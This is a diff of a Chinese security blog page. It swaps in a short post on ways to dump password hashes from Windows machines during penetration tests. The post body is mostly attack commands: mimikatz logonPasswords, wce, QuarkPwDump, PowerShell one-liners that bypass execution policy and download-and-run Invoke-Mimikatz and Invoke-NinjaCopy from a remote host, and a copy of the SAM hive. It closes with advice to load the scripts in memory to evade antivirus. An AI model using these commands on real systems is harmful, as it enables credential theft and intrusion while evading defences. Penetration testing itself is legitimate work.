@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="hash,">
 
 
 
@@ -79,14 +79,18 @@
 
 
 
+<meta name="description" content="在渗透测试过程中，对于windows系统的机器渗透需要注意hash的获取，其中hash分为LM-HASH与NTLM-HASH，在windows系统中，hash的默认存储位置为： C:\Windows\System32\config\SAM 各种工具： mimikatzprivilege::debugsekurlsa::logonPasswords wcewce.exe QuarkPwDumpQua">
+<meta name="keywords" content="hash">
 <meta property="og:type" content="article">
-<meta property="og:title" content="序列化反序列化漏洞">
-<meta property="og:url" content="http://yoursite.com/2019/08/12/序列化反序列化漏洞/index.html">
+<meta property="og:title" content="Windows下抓取hash的几种方式">
+<meta property="og:url" content="http://yoursite.com/2019/08/15/Windows下抓取hash的几种方式/index.html">
 <meta property="og:site_name" content="Don&#39;t let your dreams be dreams">
+<meta property="og:description" content="在渗透测试过程中，对于windows系统的机器渗透需要注意hash的获取，其中hash分为LM-HASH与NTLM-HASH，在windows系统中，hash的默认存储位置为： C:\Windows\System32\config\SAM 各种工具： mimikatzprivilege::debugsekurlsa::logonPasswords wcewce.exe QuarkPwDumpQua">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-12T03:25:08.583Z">
+<meta property="og:updated_time" content="2019-08-15T08:36:42.024Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="序列化反序列化漏洞">
+<meta name="twitter:title" content="Windows下抓取hash的几种方式">
+<meta name="twitter:description" content="在渗透测试过程中，对于windows系统的机器渗透需要注意hash的获取，其中hash分为LM-HASH与NTLM-HASH，在windows系统中，hash的默认存储位置为： C:\Windows\System32\config\SAM 各种工具： mimikatzprivilege::debugsekurlsa::logonPasswords wcewce.exe QuarkPwDumpQua">
 
 
 
@@ -116,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/08/12/序列化反序列化漏洞/">
+  <link rel="canonical" href="http://yoursite.com/2019/08/15/Windows下抓取hash的几种方式/">
 
 
 
 
 
-  <title>序列化反序列化漏洞 | Don't let your dreams be dreams</title>
+  <title>Windows下抓取hash的几种方式 | Don't let your dreams be dreams</title>
   
 
 
@@ -281,7 +285,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/12/序列化反序列化漏洞/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/15/Windows下抓取hash的几种方式/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="RedYan">
@@ -298,7 +302,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">序列化反序列化漏洞</h1>
+          <h1 class="post-title" itemprop="name headline">Windows下抓取hash的几种方式</h1>
         
 
         <div class="post-meta">
@@ -310,8 +314,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-12T11:25:08+08:00">
-                2019-08-12
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-15T16:32:47+08:00">
+                2019-08-15
               </time>
             
 
@@ -320,6 +324,28 @@
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -348,7 +374,17 @@
       
 
       
-        
+        <p>在渗透测试过程中，对于windows系统的机器渗透需要注意hash的获取，其中hash分为LM-HASH与NTLM-HASH，在windows系统中，hash的默认存储位置为：</p>
+<p>C:\Windows\System32\config\SAM</p>
+<h1 id="各种工具："><a href="#各种工具：" class="headerlink" title="各种工具："></a>各种工具：</h1><ul>
+<li><strong>mimikatz</strong><br><code>privilege::debugsekurlsa::logonPasswords</code></li>
+<li><strong>wce</strong><br><code>wce.exe</code></li>
+<li><strong>QuarkPwDump</strong><br><code>QuarkPwDump.exe -dhl</code></li>
+<li><strong>powershell脚本：</strong><br>使用<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">powersploit</a>中的mimikatz.ps1<br><strong>mimikatz</strong><br><strong>在线加载：</strong><br><code>powershell -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -Dumpcreds&quot;</code><br><strong>本地加载：</strong><br><code>powershell -exec bypass &quot;import-module Invoke-Mimikatz.ps1;Invoke-Mimikatz -Dumpcreds&quot;</code></li>
+</ul>
+<p><strong>Ninja-copy</strong><br><strong>在线加载：</strong><br><code>powershell -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip/Invoke-NinjaCopy.ps1&#39;);Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination C:\SAM.txt;&quot;</code><br><strong>本地加载：</strong><br><code>powershell -exec bypass &quot;Import-Module .\Invoke-NinjaCopy.ps1;Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive&quot;</code></p>
+<p>后记：为防止防火墙，杀软等工具杀掉ps1脚本，推荐使用在线加载的方式，文件不落地。</p>
+
       
     </div>
     
@@ -387,6 +423,12 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/hash/" rel="tag"># hash</a>
+          
+        </div>
+      
 
       
       
@@ -396,8 +438,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/11/文件上传漏洞/" rel="next" title="文件上传漏洞">
-                <i class="fa fa-chevron-left"></i> 文件上传漏洞
+              <a href="/2019/08/12/减肥史/" rel="next" title="减肥史">
+                <i class="fa fa-chevron-left"></i> 减肥史
               </a>
             
           </div>
@@ -405,10 +447,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/08/12/MSSQL三张特殊的系统表/" rel="prev" title="MSSQL三张特殊的系统表">
-                MSSQL三张特殊的系统表 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -460,8 +498,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -524,6 +571,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#各种工具："><span class="nav-number">1.</span> <span class="nav-text">各种工具：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
